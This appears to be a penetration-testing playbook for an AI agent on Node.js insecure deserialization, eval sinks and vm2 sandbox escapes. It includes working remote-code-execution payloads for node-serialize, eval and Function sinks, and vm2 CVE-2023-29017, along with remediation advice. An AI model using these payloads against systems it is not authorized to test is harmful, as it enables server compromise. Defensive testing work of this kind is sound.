# Insecure deserialization & code sinks (Node)

## node-serialize / funcster
`node-serialize`'s `unserialize()` runs an embedded function via the
`_$$ND_FUNC$$_` marker. If any cookie/body/param is `unserialize`d, send a JSON
body whose value is an immediately-invoked function:

    http_request(url, method:"POST",
      headers:{"Content-Type":"application/json"},
      body:'{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'sleep 5\')}()"}')

The trailing `()` runs it on deserialize. Confirm via a side effect (timing
`sleep`, an out-of-band callback, or a file you read back). `funcster`,
`serialize-to-js` and `cryo` have equivalent gadgets.

## eval / Function / vm sinks
Inputs reaching `eval`, `new Function`, `vm.runInNewContext`, `setTimeout(str)`,
or a math/expression evaluator run as code: try `7*7`→`49`, then
`require('child_process').execSync('id')` / `global.process...`. (Overlaps SSTI —
see that skill for engine-specific gadgets.)

## vm2 sandbox escape
If input reaches `new VM().run(input)` / `NodeVM` (a "safe" JS sandbox, plugin
engine, expression evaluator), target the sandbox itself — vm2 has NO version
with a complete fix (project discontinued 2023). Check package.json
(`10-fingerprint.md`) for the `"vm2"` version.
1. **CVE-2023-29017** (< 3.9.15) — abuse `Error.prepareStackTrace` during an
   async error to leak the host `Function` constructor. Send as the string that
   reaches `vm.run()`:

       {"code":"Error.prepareStackTrace=(e,frames)=>{frames.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')};(async()=>{}).constructor('return process')()"}

2. **CVE-2023-37903** (ALL versions <=3.9.19, unfixed) — abuse the cross-realm
   `Symbol.for('nodejs.util.inspect.custom')` inspect hook plus
   `WebAssembly.compileStreaming` to leak a host-realm function, then the same
   `require('child_process')` escalation. Try this whenever #1 is patched —
   since vm2 is unmaintained, every shipped version is exposed to at least one.
3. Confirm with a benign command (`id`) read via `http_flow_body` before
   escalating.

Evidence: command output where the sandbox should block `require`/`process`.
Remediation: migrate off vm2 (discontinued, unpatchable) to `isolated-vm` or
OS-level isolation; never trust a JS-only sandbox for untrusted code.

## YAML / other formats
`js-yaml` legacy `load()` of `!!js/function` executes on parse; if the endpoint
accepts YAML, send a `!!js/function` payload body.

Detect candidates first: a base64 / JSON blob in a cookie or param that
round-trips server state, or `scan_passive` / source maps revealing
`unserialize` / `eval` / `vm` calls.

Evidence: command output or the side effect (file / timing / OOB) from the
payload.
Remediation: never deserialize untrusted data with code-bearing formats; use
plain `JSON.parse`; `js-yaml` `safeLoad` / `JSON_SCHEMA`; never `eval` /
`new Function` on input.
